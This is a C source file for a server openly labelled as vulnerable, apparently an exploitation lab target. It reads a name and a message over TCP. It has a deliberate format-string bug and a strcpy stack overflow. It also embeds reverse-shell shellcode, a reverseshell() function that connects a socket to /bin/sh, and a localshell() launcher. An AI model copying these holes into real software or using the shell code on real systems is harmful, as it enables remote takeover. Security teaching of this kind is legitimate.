/*
 * Our vulnerable server. It simply reads a name and a message from a client
 * before exiting.
 */
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <pthread.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdio.h>
#include <errno.h>
#include <netdb.h>
#include <time.h>

#define	PORTNUM	8001
#define	BLENGTH	256
#define	MLENGTH	128

char
shellcode[] = 
        "\x31\xc0\x31\xdb\x31\xc9\x51\xb1"
        "\x06\x51\xb1\x01\x51\xb1\x02\x51"
        "\x89\xe1\xb3\x01\xb0\x66\xcd\x80"
        "\x89\xc2\x31\xc0\x31\xc9\x51\x51"
        "\x68\x41\x42\x43\x44\x66\x68\xb0"
        "\xef\xb1\x02\x66\x51\x89\xe7\xb3"
        "\x10\x53\x57\x52\x89\xe1\xb3\x03"
        "\xb0\x66\xcd\x80\x31\xc9\x39\xc1"
        "\x74\x06\x31\xc0\xb0\x01\xcd\x80"
        "\x31\xc0\xb0\x3f\x89\xd3\xcd\x80"
        "\x31\xc0\xb0\x3f\x89\xd3\xb1\x01"
        "\xcd\x80\x31\xc0\xb0\x3f\x89\xd3"
        "\xb1\x02\xcd\x80\x31\xc0\x31\xd2"
        "\x50\x68\x6e\x2f\x73\x68\x68\x2f"
        "\x2f\x62\x69\x89\xe3\x50\x53\x89"
        "\xe1\xb0\x0b\xcd\x80\x31\xc0\xb0"
        "\x01\xcd\x80";

/* Dummy print string*/
void
dummy()
{
	printf("howdy\n");
}

void
localshell(void)
{
	char *name[2];
	/* Initialise */
	name[0] = "/bin/sh";
	name[1] = NULL;
	/* Launch shell */
	execve(name[0],
	name, NULL);
}

int reverseshell()
{
                int soc,rc;
                struct sockaddr_in serv_addr;

                serv_addr.sin_family=2;
                serv_addr.sin_addr.s_addr=0x0100007f;
                serv_addr.sin_port=0xAAAA; /* port 43690 */
                soc=socket(2,1,6);
                rc = connect(soc, (struct sockaddr *)&serv_addr,0x10);
                dup2(soc,0);
                dup2(soc,1);
                dup2(soc,2);
                execle("/bin/sh",0,0);
}


/* Read the name of a client */
static void
read_name(int s, char *buffer, char *greeting)
{
  char *p;

  /* Construct a prompt */
  snprintf(buffer, BLENGTH, "Please enter your name:\n");

  /* Send the prompt to the client */
  send(s, (void *)buffer, BLENGTH, 0);

  /* Receive a response from the client */
  recv(s, (void *)buffer, BLENGTH, 0);

  /* Remove trailing '\n' from the response */
  p = buffer + strlen(buffer) - 1;
  *p = '\0';

  /* Transfer response to greeting */
  snprintf(greeting, BLENGTH, buffer);

  /* Construct greeting */
  strncat(greeting, ", you are most welcome!\n", BLENGTH);

  /* Send greeting to client */
  send(s, greeting, BLENGTH, 0);
}

/* Read a message from a client */
static void
read_message(int s, char *buffer, char *message)
{
  /* Construct a prompt */
  snprintf(buffer, BLENGTH, "Please enter your message:\n");

  /* Send the prompt to the client */
  send(s, (void *)buffer, BLENGTH, 0);

  /* Receive a response from the client */
  recv(s, (void *)buffer, BLENGTH, 0);

  printf("Length of message: %d\n",strlen(buffer));

  /* Copy the response to a local buffer */
  strcpy(message, buffer);

  printf("Fin\n");

}

/* Make an introduction */
static void
do_first_bit(int s)
{
  char greeting[BLENGTH];
  char buffer[BLENGTH];

  read_name(s, buffer, greeting);
}

/* Do the work */
static void
do_second_bit(int s)
{
  char message[MLENGTH];
  char buffer[BLENGTH];

  read_message(s, buffer, message);
}

/* One thread per connection */
void *
handler(void *n)
{
  int	s;

  /* Detach */
  pthread_detach(pthread_self());

  /* Cast parameter */
  s = *((int *)n);

  /* Make an introduction */
  do_first_bit(s);

  /* Do the work */
  do_second_bit(s);

  /* Close the socket */
  close(s);

  /* Free memory */
  free(n);

  return ((void *)NULL);
}

/* Connect and talk to a client */
int
main()
{
  struct sockaddr_in socketname, client;
  struct hostent *host;
  socklen_t clientlen = sizeof (client);
  pthread_t tid;
  int s, n, *c, optval = 1;

  /* We will always be localhost */
  if ((host = gethostbyname("localhost")) == NULL) {
    perror("gethostbyname()");
    exit(EXIT_FAILURE);
  }

  /* Fill in the socket address structure */
  memset((char *)&socketname, '\0', sizeof (socketname));
  socketname.sin_family = AF_INET;
  socketname.sin_port = htons(PORTNUM);
  memcpy((char *)&socketname.sin_addr, host->h_addr_list[0], host->h_length);

  /* Create an Internet family, stream socket */
  s = socket(AF_INET, SOCK_STREAM, 0);

  /* Did that work? */
  if (s < 0) {
    perror("socket()");
    exit(EXIT_FAILURE);
  }

  /* Allow binding if waiting on kernel to clean up */
  if (setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof (optval)) < 0) {
    perror("setsockopt()");
    exit(EXIT_FAILURE);
  }

  /* Now bind the address to our socket so it becomes visible */
  if (bind(s, (struct sockaddr *)&socketname, sizeof (socketname)) < 0) {
    perror("bind()");
    exit(EXIT_FAILURE);
  }

  /* Make our now visible socket available for connections */
  if (listen(s, 5)) {
    perror("listen()");
    exit(EXIT_FAILURE);
  }

  /* Loop forever */
  while (1) {

    /* Accept a connection */
    n = accept(s, (struct sockaddr *)&client, &clientlen);

    /* Did that work? */
    if (n < 0) {
      perror("accept()");
      exit(EXIT_FAILURE);
    }

    /* Allocate room for socket for this thread */
    c = malloc(sizeof (*c));

    /* Check we got some memory */
    if (!c) {
      perror("malloc()");
      exit(EXIT_FAILURE);
    }

    /* Initialise */
    *c = n;

    /* Have a conversation */
    pthread_create(&tid, NULL, handler, (void *)c);		
  }

  /* Close socket */
  close(s);

  return (0);
}
